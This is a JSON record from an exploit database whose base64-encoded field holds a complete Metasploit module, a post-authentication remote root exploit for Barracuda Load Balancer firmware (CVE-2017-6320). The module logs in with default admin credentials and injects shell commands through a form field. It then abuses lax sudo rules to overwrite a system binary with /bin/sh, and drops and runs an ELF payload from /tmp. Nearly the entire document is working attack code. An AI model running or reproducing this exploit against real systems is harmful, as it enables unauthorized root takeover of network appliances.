{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBCYXJyYWN1ZGEgTG9hZCBCYWxhbmNlciBGaXJtd2FyZSA8PSB2Ni4wLjEuMDA2ICgyMDE2LTA4LTE5KSBQb3N0QXV0aCByZW1vdGUgcm9vdCBleHBsb2l0DQojDQojIERhdGU6IDAxLzA2LzIwMTcgKE9yaWdpbmFsbHkgZGlzY292ZXJlZDogMy8xNikNCiMgRXhwbG9pdCBBdXRob3I6IHhvcnQNCiMgU29mdHdhcmUgTGluazogaHR0cHM6Ly93d3cuYmFycmFjdWRhLmNvbS9wcm9kdWN0cy9sb2FkYmFsYW5jZXINCiMgVmVyc2lvbjogRmlybXdhcmUgPD0gIHY2LjAuMS4wMDYgKDIwMTYtMDgtMTkpDQojIFRlc3RlZCBvbjogNi4wLjEuMDA2ICgyMDE2LTA4LTE5KQ0KIyAgICAgICAgICAgIDYuMC4wLjAwNSAoMjAxNi0wMy0yMikgLSBjaGVja2VkOjQvOC8xNg0KIwkgICAgIDUuNC4wLjAwNCAoMjAxNS0xMS0yNikgLSBjaGVja2VkOjMvMTYNCiMNCiMgTm90IFZ1bG46ICA2LjEuMC4wMDMgKDIwMTctMDEtMTcpDQojIENWRSA6IENWRS0yMDE3LTYzMjANCiMNCiMgdnVsbjogb25kZWZpbmVkX2RlbGV0ZV9hc3Nlc3NtZW50IHRyaWdnZXIgZXhwbG9pdA0KIw0KIyBQb3N0YXV0aCByZW1vdGUgcm9vdCBpbiBCYXJyYWN1ZGEgTG9hZCBCYWxhbmNlciBGaXJtd2FyZSA8PSAgdjYuMC4xLjAwNiBmb3IgYW55IHVuZGVyIHByaXZpbGVkZ2VkIHVzZXIgd2l0aCByZXBvcnQgZ2VuZXJhdGluZw0KIyBjYXBhYmxpdGllcy4gVGhpcyBleHBsb2l0IGxldmVyYWdlcyBhIGNvbW1hbmQgaW5qZWN0aW9uIGJ1ZyBhbG9uZyB3aXRoIHBvb3Igc3VkbyBwZXJtaXNzaW9ucyB0byBvYnRhaW4NCiMgcm9vdC4NCiMNCiMgeG9ydCBAIENyaXRpY2FsIFN0YXJ0DQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0MyA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQoJUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCglpbmNsdWRlICBFeHBsb2l0OjpSZW1vdGU6OlRjcA0KICAgICAgICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UmVtb3RlOjpIdHRwQ2xpZW50DQoNCglkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQoJCXN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQoJCQknTmFtZScgICAgICAgICAgID0+ICdCYXJyYWN1ZGEgTG9hZCBCYWxhbmNlciBGaXJtd2FyZSA8PSAgdjYuMC4xLjAwNiBkZWxldGVfYXNzZXNzbWVudCByb290IGV4cGxvaXQnLA0KCQkJCQknRGVzY3JpcHRpb24nICAgID0+ICVxew0KCQkJCQlUaGlzIG1vZHVsZSBleHBsb2l0cyBhIHJlbW90ZSBjb21tYW5kIGV4ZWN1dGlvbiB2dWxuZXJhYmlsaXR5IGluDQoJCQkJdGhlIEJhcnJhY3VkYSBMb2FkIEJhbGFuY2VyIEZpcm13YXJlIFZlcnNpb24gPD0gIHY2LjAuMS4wMDYgKDIwMTYtMDgtMTkpIGJ5IGV4cGxvaXRpbmcgYQ0KCQkJCXZ1bG5lcmFiaWxpdHkgaW4gdGhlIHdlYiBhZG1pbmlzdHJhdGlvbiBpbnRlcmZhY2UuDQoJCQkJCUJ5IHNlbmRpbmcgYSBzcGVjaWFsbHkgY3JhZnRlZCByZXF1ZXN0IGl0J3MgcG9zc2libGUgdG8gaW5qZWN0IHN5c3RlbQ0KCQkJCSBjb21tYW5kcyB3aGlsZSBlc2NhbGF0aW5nIHRvIHJvb3QgZG8gdG8gcmVsYXhlZCBzdWRvIGNvbmZpZ3VyYXRpb24gb24gdGhlIGxvY2FsIA0KCQkJCW1hY2hpbmUuDQoJCQl9LA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ3hvcnQnLCAjIHZ1bG4gKyBtZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCV0sDQoJCQknVmVyc2lvbicgICAgICAgID0+ICckUmV2aXNpb246IDIgJCcsDQoJCQknUmVmZXJlbmNlcycgICAgID0+DQoJCQkJWw0KCQkJCQlbICdub25lJywgJ25vbmUnXSwNCgkJCQldLA0KCQkJJ1BsYXRmb3JtJyAgICAgID0+IFsgJ2xpbnV4J10sDQoJCQknUHJpdmlsZWdlZCcgICAgID0+IHRydWUsDQoJCQkgJ0FyY2gnICAgICAgICAgID0+IFsgQVJDSF9YODYgXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICdTZXNzaW9uVHlwZXMnICA9PiBbICdzaGVsbCcgXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQoNCgkJICAgICAgICAnUGF5bG9hZCcgICAgICAgID0+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0NvbXBhdCcgPT4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ0Nvbm5lY3Rpb25UeXBlJyA9PiAnZmluZCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LA0KDQoJCQknVGFyZ2V0cycgICAgICAgID0+DQoJCQkJWw0KCQkJCQlbJ0xpbnV4IFVuaXZlcnNhbCcsDQoJCQkJCQl7DQoJCQkJCQkJCSdBcmNoJyA9PiBBUkNIX1g4NiwNCgkJCQkJCQkJJ1BsYXRmb3JtJyA9PiAnbGludXgnDQoJCQkJCQl9DQoJCQkJCV0sDQoJCQkJXSwNCgkJCSdEZWZhdWx0VGFyZ2V0JyA9PiAwKSkNCg0KCQkJcmVnaXN0ZXJfb3B0aW9ucygNCgkJCQlbDQoJCQkJCU9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyBmYWxzZSwgJ0RldmljZSBwYXNzd29yZCcsICIiIF0pLAkNCgkJCQkJT3B0U3RyaW5nLm5ldygnRVQnLCBbIGZhbHNlLCAnRGV2aWNlIHBhc3N3b3JkJywgIiIgXSksDQoJCQkgICAgICAgICAJT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbIHRydWUsICdEZXZpY2UgcGFzc3dvcmQnLCAiYWRtaW4iIF0pLAkNCgkJCQkJT3B0U3RyaW5nLm5ldygnQ01EJywgWyBmYWxzZSwgJ0NvbW1hbmQgdG8gZXhlY3V0ZScsICIiIF0pLAkNCgkJCQkJT3B0OjpSUE9SVCg4MDAwKSwNCgkJCQldLCBzZWxmLmNsYXNzKQ0KCWVuZA0KDQogICAgICAgIGRlZiBkb19sb2dpbih1c2VybmFtZSwgcGFzc3dvcmRfY2xlYXIsIGV0KQ0KICAgICAgICAgICAgICAgIHZwcmludF9zdGF0dXMoICJMb2dnaW5nIGludG8gbWFjaGluZSB3aXRoIGNyZWRlbnRpYWxzLi4uXG4iICkNCg0KICAgICAgICAgICAgICAgICMgdmFycw0KICAgICAgICAgICAgICAgIHRpbWVvdXQgPSAxNTUwOw0KICAgICAgICAgICAgICAgIGVuY19rZXkgPSBSZXg6OlRleHQucmFuZF90ZXh0X2hleCgzMikNCg0KICAgICAgICAgICAgICAgICMgc2VuZCByZXF1ZXN0ICANCiAgICAgICAgICAgICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAnbWV0aG9kJyAgPT4gJ1BPU1QnLA0KICAgICAgICAgICAgICAgICAgICAgICd1cmknICAgICA9PiAiL2NnaS1tb2QvaW5kZXguY2dpIiwNCgkJICAgICAgJ2hlYWRlcnMnID0+IA0KCQkJew0KCQkJCSdBY2NlcHQnID0+ICJhcHBsaWNhdGlvbi9qc29uLCB0ZXh0L2phdmFzY3JpcHQsICovKjsgcT0wLjAxIiwNCgkJCQknQ29udGVudC1UeXBlJyA9PiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwNCgkJCQknWC1SZXF1ZXN0ZWQtV2l0aCcgPT4gIlhNTEh0dHBSZXF1ZXN0Ig0KCQkJfSwNCiAgICAgICAgICAgICAgICAgICAgICAndmFyc19wb3N0JyA9Pg0KICAgICAgICAgICAgICAgICAgICAgICAgew0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICdlbmNfa2V5JyA9PiBlbmNfa2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnZXQnID0+IGV0LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAndXNlcicgPT4gImFkbWluIiwgIyB1c2VybmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Bhc3N3b3JkJyA9PiAiYWRtaW4iLCAjIHBhc3N3b3JkX2NsZWFyLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnZW5jdHlwZScgPT4gIm5vbmUiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAncGFzc3dvcmRfZW50cnknID0+ICIiLA0KCQkJICAnbG9naW5fcGFnZScgPT4gIjEiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnbG9naW5fc3RhdGUnID0+ICJvdXQiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAncmVhbF91c2VyJyA9PiAiIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2xvY2FsZScgPT4gImVuX1VTIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2Zvcm0nID0+ICJmIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ1N1Ym1pdCcgPT4gIlNpZ24gaW4iLA0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0sIHRpbWVvdXQpDQoNCiAgICAgICAgICAgICAgICAjIGdldCByaWQgb2YgZmlyc3QgeWFuayANCiAgICAgICAgICAgICAgICBwYXNzd29yZCA9IHJlcy5ib2R5LnNwbGl0KCdcbicpLmdyZXAoLyguKilwYXNzd29yZD0oW14mXSspJi8peyQyfVswXSAjY2hhbmdlIHRvIG1hdGNoIGJlbG93IGZvciBtb3JlIGV4YWN0IHJlc3VsdA0KICAgICAgICAgICAgICAgIGV0ID0gcmVzLmJvZHkuc3BsaXQoJ1xuJykuZ3JlcCgvKC4qKWV0PShbXiZdKykmLyl7JDJ9WzBdDQoNCiAgICAgICAgICAgICAgICByZXR1cm4gcGFzc3dvcmQsIGV0DQogICAgICAgIGVuZA0KDQoJZGVmIHJ1bl9jb21tYW5kKHVzZXJuYW1lLCBwYXNzd29yZCwgZXQsIGNtZCkNCgkJdnByaW50X3N0YXR1cyggIlJ1bm5pbmcgQ29tbWFuZC4uLlxuIiApDQoNCiAJCSMgZmlsZSB0byByZXBsYWNlDQogICAgICAgICAgICAgICAgI3N1ZG9fY21kX2V4ZWMgPSAiL2hvbWUvcHJvZHVjdC9jb2RlL2Zpcm13YXJlL2N1cnJlbnQvYmluL2NvbmZpZ19hZ2VudF93cmFwcGVyLnBsIg0KICAgICAgICAgICAgICAgIHN1ZG9fY21kX2V4ZWMgPSAiL2hvbWUvcHJvZHVjdC9jb2RlL2Zpcm13YXJlL2N1cnJlbnQvYmluL3JkcGQiDQoNCiAgICAgICAgICAgICAgICBzdWRvX3J1bl9jbWRfMSA9ICJzdWRvIC9iaW4vY3AgL2Jpbi9zaCAje3N1ZG9fY21kX2V4ZWN9IDsgc3VkbyAvYmluL2NobW9kICt4ICN7c3Vkb19jbWRfZXhlY30iDQogICAgICAgICAgICAgICAgc3Vkb19ydW5fY21kXzIgPSAic3VkbyAje3N1ZG9fY21kX2V4ZWN9IC1jICINCg0KICAgICAgICAgICAgICAgICMgcmFuZG9tIGZpbGVuYW1lIHRvIGR1bXAgdG9vICsgJ3RtcCcgSEFTIHRvIGJlIGhlcmUuDQogICAgICAgICAgICAgICAgYjY0ZHVtcGZpbGUgPSAiL3RtcC8iICsgcmFuZF90ZXh0X2FscGhhbnVtZXJpYyg0K3JhbmQoNCkpDQoNCgkJdnByaW50X3N0YXR1cygiIGZpbGUgPSAiICsgYjY0ZHVtcGZpbGUpDQoNCiAgICAgICAgICAgICAgICAjIGRlY29kZXIgc3R1YnMgLSB0ZWxscyAnYmFzZTY0JyBjb21tYW5kIHRvIGRlY29kZSBhbmQgZHVtcCBkYXRhIHRvIHRlbXAgZmlsZQ0KICAgICAgICAgICAgICAgIGI2NGRlY29kZTEgPSAiZWNobyBcIiINCiAgICAgICAgICAgICAgICBiNjRkZWNvZGUyID0gIlwiIHwgYmFzZTY0IC1kID4iICsgYjY0ZHVtcGZpbGUNCg0KICAgICAgICAgICAgICAgICMgYmFzZTY0IC0gZW5jb2RlIHdpdGggYmFzZTY0IHNvIHdlIGNhbiBzZW5kIHNwZWNpYWwgY2hhcnMgYW5kIG11bHRpcGxlIGxpbmVzDQogICAgICAgICAgICAgICAgY21kID0gQmFzZTY0LnN0cmljdF9lbmNvZGU2NChjbWQpDQoNCiAgICAgICAgICAgICAgICAjIENyZWF0ZSBpbmplY3Rpb24gc3RyaW5nLg0KICAgICAgICAgICAgICAgICMgICAgICBhKSBwYWNrYWdlIHRoZSAgYmFzZTY0IGRlY29kZXIgd2l0aCBlbmNvZGVkIGJ5dGVzDQogICAgICAgICAgICAgICAgIyAgICAgIGIpIGF0dGFjaCBhIGNobW9kICt4IHJlcXVlc3QgdG8gbWFrZSB0aGUgc2NyaXB0IGNyZWF0ZWQgKGI2NGR1bXBmaWxlKSBleGVjdXRhYmxlDQogICAgICAgICAgICAgICAgIyAgICAgIGMpIGV4ZWN1dGUgZGVjb2RlZCBiYXNlNjQgZHVtcGZpbGUNCg0KICAgICAgICAgICAgICAgIGluamVjdGlvbl9zdHJpbmcgPSBiNjRkZWNvZGUxICsgY21kICsgYjY0ZGVjb2RlMiArICI7IC9iaW4vY2htb2QgK3ggIiArIGI2NGR1bXBmaWxlICsgIjsgIiArIHN1ZG9fcnVuX2NtZF8xICsgIjsgIiArIHN1ZG9fcnVuX2NtZF8yICsgYjY0ZHVtcGZpbGUgIyArICIgOyBybSAiICsgYjY0ZHVtcGZpbGUNCg0KCSAJZXhwbG9pdHJlcSA9IFsNCgkJWyAiYXV0aF90eXBlIiwiTG9jYWwiIF0sDQoJCVsgImV0IixldCBdLA0KCQlbICJsb2NhbGUiLCJlbl9VUyIgXSwNCgkJWyAicGFzc3dvcmQiLCBwYXNzd29yZCAgXSwNCgkJWyAicHJpbWFyeV90YWIiLCAiQURWQU5DRSIgXSwNCgkJWyAicmVhbG0iLCIiIF0sDQoJCVsgInNlY29uZGFyeV90YWIiLCJhZHZhbmNlZF9zeXN0ZW0iIF0sDQoJCVsgInVzZXIiLCB1c2VybmFtZSBdLA0KCQlbICJ0aW1lc3RhbXAiLCBUaW1lLm5vdy50b19pIF0sDQoNCgkJWyAiVVBEQVRFX3NjYW5faW5mb3JtYXRpb25faW5fdXNlIiwgInh4OyAje2luamVjdGlvbl9zdHJpbmd9IiBdLCAjIHZ1bG4NCgkJWyAiZGVsZXRlX2Fzc2Vzc21lbnQiLCAgUmV4OjpUZXh0LnJhbmRfdGV4dF9udW1lcmljKDIwKSBdDQoJCV0NCgkJDQoJCWJvdW5kYXJ5ID0gIi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIgKyBSZXg6OlRleHQucmFuZF90ZXh0X251bWVyaWMoMzQpDQoNCgkJcG9zdF9kYXRhID0gIiINCgkNCgkJZXhwbG9pdHJlcS5lYWNoIGRvIHx4cmVxfA0KCQkgICAgcG9zdF9kYXRhIDw8ICItLSN7Ym91bmRhcnl9XHJcbiINCgkJICAgIHBvc3RfZGF0YSA8PCAiQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPVwiI3t4cmVxWzBdfVwiXHJcblxyXG4iDQoJCSAgICBwb3N0X2RhdGEgPDwgIiN7eHJlcVsxXX1cclxuIg0KCQllbmQNCgkgICAgCXBvc3RfZGF0YSA8PCAiLS0je2JvdW5kYXJ5fS0tXHJcbiINCg0KCSAgICAgICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAgICAJICAgJ21ldGhvZCcgPT4gJ1BPU1QnLA0KCSAgICAgICAgICAgJ3VyaScgICAgPT4gIi9jZ2ktbW9kL2luZGV4LmNnaSIsDQogICAgICAgCQkgICAnY3R5cGUnICA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9I3tib3VuZGFyeX0iLA0KICAgICAgICAgICAgCSAgICdkYXRhJyAgID0+IHBvc3RfZGF0YSwNCgkJICAgJ2hlYWRlcnMnID0+IA0KCQkJew0KCQkJCSdVc2VyQWdlbnQnID0+ICJNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xOC4wIiwNCgkJCX0NCgkgICAgICAgIH0pCQ0KCWVuZA0KDQoJZGVmIHJ1bl9zY3JpcHQodXNlcm5hbWUsIHBhc3N3b3JkLCBldCwgY21kcykNCgkgIAl2cHJpbnRfc3RhdHVzKCAicnVubmluZyBzY3JpcHQuLi5cbiIpDQoJICANCgkgIA0KCWVuZA0KCQ0KCWRlZiBleHBsb2l0DQoJCSMgdGltZW91dA0KCQl0aW1lb3V0ID0gMTU1MDsNCg0KCQl1c2VyID0gImFkbWluIg0KCQkNCgkJIyBwYXJhbXMNCiAgICAgICAgICAgICAgICByZWFsX3VzZXIgPSAiIjsNCgkJbG9naW5fc3RhdGUgPSAib3V0Ig0KCQlldCA9IFRpbWUubm93LnRvX2kNCgkJbG9jYWxlID0gImVuX1VTIg0KCQl1c2VyID0gImFkbWluIg0KCQlwYXNzd29yZCA9ICJhZG1pbiINCgkJZW5jdHlwZSA9ICJNRDUiDQoJCXBhc3N3b3JkX2VudHJ5ID0gIiINCgkJcGFzc3dvcmRfY2xlYXIgPSAiYWRtaW4iDQoJCQ0KCQlwYXNzd29yZF9oYXNoLCBldCA9IGRvX2xvZ2luKHVzZXIsIHBhc3N3b3JkX2NsZWFyLCBldCkNCgkJdnByaW50X3N0YXR1cygibmV3IHBhc3N3b3JkOiAje3Bhc3N3b3JkX2hhc2h9IGV0OiAje2V0fVxuIikNCg0KCQlzbGVlcCg1KQ0KDQoNCgkJICNpZiBubyAnQ01EJyBzdHJpbmcgLSBhZGQgY29kZSBmb3Igcm9vdCBzaGVsbA0KICAgICAgICAgICAgICAgIGlmIG5vdCBkYXRhc3RvcmVbJ0NNRCddLm5pbD8gYW5kIG5vdCBkYXRhc3RvcmVbJ0NNRCddLmVtcHR5Pw0KDQogICAgICAgICAgICAgICAgICAgICAgICBjbWQgPSBkYXRhc3RvcmVbJ0NNRCddDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMgRW5jb2RlIGNtZCBwYXlsb2FkDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkX2NtZCA9IGNtZC51bnBhY2soIkgqIikuam9pbigpLmdzdWIoLyhcdykoXHcpLywnXFx4XDFcMicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMga2lsbCBzdGFsZSBjYWxscyB0byBiZHVtcCBmcm9tIHByZXZpb3VzIGV4cGxvaXQgY2FsbHMgZm9yIHJlLXVzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcnVuX2NvbW1hbmQodXNlciwgcGFzc3dvcmRfaGFzaCwgZXQsICgic3VkbyAvYmluL3JtIC1mIC90bXAvbiA7cHJpbnRmIFwiI3tlbmNvZGVkX2NtZH1cIiA+IC90bXAvbjsgY2htb2QgK3J4IC90bXAvbiA7IC90bXAvbiIgKSkNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAjIEVuY29kZSBwYXlsb2FkIHRvIEVMRiBmaWxlIGZvciBkZXBsb3ltZW50DQogICAgICAgICAgICAgICAgICAgICAgICBlbGYgPSBNc2Y6OlV0aWw6OkVYRS50b19saW51eF94ODZfZWxmKGZyYW1ld29yaywgcGF5bG9hZC5yYXcpDQogICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVkX2VsZiA9IGVsZi51bnBhY2soIkgqIikuam9pbigpLmdzdWIoLyhcdykoXHcpLywnXFx4XDFcMicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICMga2lsbCBzdGFsZSBjYWxscyB0byBiZHVtcCBmcm9tIHByZXZpb3VzIGV4cGxvaXQgY2FsbHMgZm9yIHJlLXVzZQ0KIyAgICAgICAgICAgICAgICAgICAgICAgIHJ1bl9jb21tYW5kKHVzZXIsIHBhc3N3b3JkX2hhc2gsIGV0LCAoInN1ZG8gL2Jpbi9ybSAtZiAvdG1wL20gO3ByaW50ZiBcIiN7ZW5jb2RlZF9lbGZ9XCIgPiAvdG1wL207IGNobW9kICtyeCAvdG1wL20gOyAvdG1wL20iICkpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIHJ1bl9jb21tYW5kKHVzZXIsIHBhc3N3b3JkX2hhc2gsIGV0LCAoInByaW50ZiBcIiN7ZW5jb2RlZF9lbGZ9XCIgPiAvdG1wL207IGNobW9kICtyeCAvdG1wL20gOyAvdG1wL20iICkpDQogICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyDQogICAgICAgICAgICAgICAgZW5kDQoNCg0KCWVuZA0KDQplbmQ=", 
    "filename": "platforms/hardware/webapps/42333.rb", 
    "id": "42333", 
    "cves": [
        "CVE-2017-6320"
    ]
}